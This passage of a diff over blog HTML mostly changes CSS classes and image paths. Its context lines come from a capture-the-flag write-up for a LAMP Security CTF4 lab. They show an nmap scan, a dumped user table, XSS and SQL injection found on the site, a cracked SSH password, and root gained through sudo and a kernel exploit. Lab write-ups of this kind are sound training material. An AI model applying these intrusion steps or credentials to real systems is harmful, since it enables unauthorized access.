 &lt;p&gt;After some local enumeration, I discovered that the OS was vulnerable to this &lt;a href=&quot;http://www.exploit-db.com/exploits/9479/&quot;&gt;exploit&lt;/a&gt;:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.2# id
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.2# id
 id
 uid=0(root) gid=0(root) groups=48(apache) context=system_u:system_r:httpd_t:s0
 bash-3.2# cat /passwd
@@ -1144,7 +1144,7 @@ bash-3.2#
   &lt;li&gt;database content:&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;+—–+———-+————+———————————-+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;+—–+———-+————+———————————-+
 | uid | name | login | pass |
 +—–+———-+————+———————————-+
 | 0 | | 0 | |
@@ -1175,7 +1175,7 @@ bash-3.2#
 
 &lt;p&gt;Ok let’s start, i ran nmap to see which services were open (usually I run a second scan with “-p 1-65535” parameter to identify all the ports).&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syrion:~ syrion$ sudo nmap -sT -sV -O ctf07.root-me.org
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syrion:~ syrion$ sudo nmap -sT -sV -O ctf07.root-me.org
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-10-07 21:19 CEST
 Nmap scan report for ctf07.root-me.org (212.83.142.84)
 Host is up (0.040s latency).
@@ -1201,23 +1201,23 @@ No exact OS matches for host (test conditions non-ideal).
 
 &lt;p&gt;In the meantime,  I ran DirBuster, and I noticed this file:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf4-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf4-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;It was the database’s structure:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf4-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf4-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;This was the website on port 80:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf4-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf4-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;I noticed this xss on the search bar:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf4-writeup/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf4-writeup/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Then I found an SQL Injection on the blog:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf4-writeup/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf4-writeup/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;At this pont I started to enumerate the select statement’s parameters by using this payloads:&lt;/p&gt;
 
@@ -1228,25 +1228,25 @@ No exact OS matches for host (test conditions non-ideal).
 
 &lt;p&gt;They were five!&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf4-writeup/img6.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf4-writeup/img6.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;I needed to know which parameters were visible:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf4-writeup/img7.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf4-writeup/img7.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;And then I performed the full SQL Inection (i knew the database structure because of db.sql):&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf4-writeup/img8.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/2016-12-20-lamp-security-ctf4-writeup/img8.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Ok let’s use &lt;a href=&quot;https://crackstation.net/&quot;&gt;crackstation&lt;/a&gt; to crack the hash. I tried to login as dstevens via ssh with the following credentials:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;username dstevens
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;username dstevens
 password: ilike2surf
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;And I succeeded:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syrion:~ syrion$ ssh dstevens@ctf07.root-me.org
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syrion:~ syrion$ ssh dstevens@ctf07.root-me.org
 The authenticity of host ‘ctf07.root-me.org (212.83.142.84)’ can’t be established.
 RSA key fingerprint is SHA256:NDWh6/414mOsW4P7K6ICc5R67PrX87ADMFUx9DK9ftk.
 Are you sure you want to continue connecting (yes/no)? yes
@@ -1259,7 +1259,7 @@ Last login: Mon Mar  9 07:48:18 2009 from 192.168.0.50
 
 &lt;p&gt;I tried to run “sudo su” and yes… it worked (LOL):&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[dstevens@ctf ~]$ sudo su
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[dstevens@ctf ~]$ sudo su
 Password:
 [root@ctf dstevens]# id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=user_u:system_r:unconfined_t:SystemLow-SystemHigh
